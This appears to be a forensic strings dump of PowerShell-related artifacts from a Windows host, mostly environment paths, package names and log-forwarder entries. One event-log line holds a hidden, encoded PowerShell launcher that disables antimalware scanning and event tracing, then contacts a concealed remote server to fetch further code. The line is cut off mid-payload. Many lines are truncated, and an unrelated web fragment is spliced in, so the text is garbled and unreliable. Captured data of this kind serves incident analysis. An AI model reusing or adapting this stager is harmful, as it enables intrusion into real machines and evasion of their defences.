+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+%AppData%\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk
+%systemroot%\system32\windowspowershell\v1.0\powershell_ise.exe
+%AppData%\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk
+ll@%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe,-124%System
+@%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe,-124
+source::C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+source::C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-PowerShell-V2-ServerCore-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat
+{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\WindowsPowerShell\v1.0\powershell.exe
+X\Device\HarddiskVolume1\Windows\System32\WindowsPowerShell\v1.0\powershell.exe-
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPower
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+h=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+POWERSHELL.EXEm
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe
+%SystemRoot%_SysWOW64_WindowsPowerShell_v1.0_powershell.exe
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+ll\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+HYPERV-UX-POWERSHELL-MODULE-HYPERV-WOW64-VM-PACKAGE~31BF3856AD364E35~AMD64~EN-US~10.0.17763.1
+{D65231B0-B2F1-4857-A4CE-A8E7C6EA7D27}\WindowsPowerShell\v1.0\PowerShell_ISE.exe	9647
+Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package081120~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat|!
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+08-30-2024 16:17:04.644 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' has stopped changing, will read it now.
+08-30-2024 16:17:04.646 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:17:04.646 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:17:04.655 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx'
+08-30-2024 16:17:05.145 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx': total_events='9' with empty_msg='0'.
+08-30-2024 16:17:23.833 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' updated less than 10000ms ago, will not read it until it stops changing. File size=1118208
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+gramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+gramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft.PowerShellCmdletDefinitionXML.1
+source::C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx||WinEventLog:Microsoft-Windows-PowerShell/Operational|
+source::C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx|host::Client2.BCS.local|WinEventLog:Microsoft-Windows-PowerShell/Operational|
+08-22-2023 11:09:14.241 -0700 INFO  ModularInputs [3232 MainThread] - Introspection setup completed for scheme "powershell".
+08-22-2023 11:09:14.354 -0700 INFO  ModularInputs [3232 MainThread] - Introspection setup completed for scheme "powershell2".
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+ws\system32\WindowsPowerShell\v1.0\ModulY
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+source::C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+source::C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+sourcetype::WinEventLog:Microsoft-Windows-PowerShell/Operational
+Microsoft-Shielded-VM-Tools-PowerShell-Package~31bf3856ad364e35~amd64~~0.0.0.0
+Microsoft-Shielded-VM-Tools-PowerShell-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1
+WindowsPowerShell
+powershell_ise.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+08-30-2024 15:59:26.265 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\microsoft-windows-powershell%4operational.evtx", kbps=0.515, eps=0.148, kb=31.423, ev=9, avg_age=12.111, max_age=13, interval_sec=60
+08-30-2024 15:59:26.265 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.381, eps=0.115, kb=23.265, ev=7, avg_age=40.000, max_age=40, interval_sec=60
+S.local|WinEventLog:Microsoft-Windows-PowerShell/Operational|
+Microsoft-Windows-PowerShell-V2-ServerCore-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-PowerShell
+C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+fctx[.site[1.en_US].sctx[home.Storefront-Homepage.chSEM_CHANNEL]]common[.tAirport & car rental deals.vnull]1370437829.p0exp[.eSPT_TGFH_Apartment_Redirection.b1]fragment EGDSGraphicTextFragment on EGDSGraphicText { graphic { 31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+MicrosoftWindowsPowerShellRoot
+MicrosoftWindowsPowerShell
+MicrosoftWindowsPowerShellV2
+MicrosoftWindowsPowerShellISE
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+powershell_RASMANCST)
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Xs\Windows PowerShell.evtx': total_events='9'
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Windows PowerShell ISE (x86).lnk=@%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe,-102
+Windows PowerShell ISE.lnk=@%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe,-101
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+powershell.exe
+ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+'PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+WindowsPowerShell
+powershell_ise.exe
+WindowsPowerShell
+powershell_ise.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+sourcetype::WinEventLog:Microsoft-Windows-PowerShell/Operational
+WindowsPowerShell
+WindowsPowerShell
+WindowsPowerShell
+sourcetype::WinEventLog:Windows PowerShell
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\syste
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+_path7C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+LogName=Windows PowerShell
+SourceName=PowerShell
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -w Hidden -enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB6AEEAQwA0AEEATQBRAEEAMABBAEQAQQBBAEwAZwBBAHoAQQBEAE0AQQBMAGcAQQB4AEEARABJAEEATQBBAEEANgBBAEQAawBBAE0AQQBBAHcAQQBEAE0AQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnACEAaAB6ACUAMgB4ADYAbQB0AEMAMABBAGUAWQBWACwANQBXAGoAdQA4ADQALwBbAHMAbgBMAGEAWABIAF8ARAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcgByAHYAaABiAGEAeAA9AHoAegBFADIAYQBuAGMAaQBjAG8ARgBoAG8AdwBJAGUAcAB1AFAASABkAHoANQAvAE8AZwBrAD0AIgApADsAJABkAGEAdABhAD0AJAB3AGMALgBEAG8AdwBuAGwAb
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
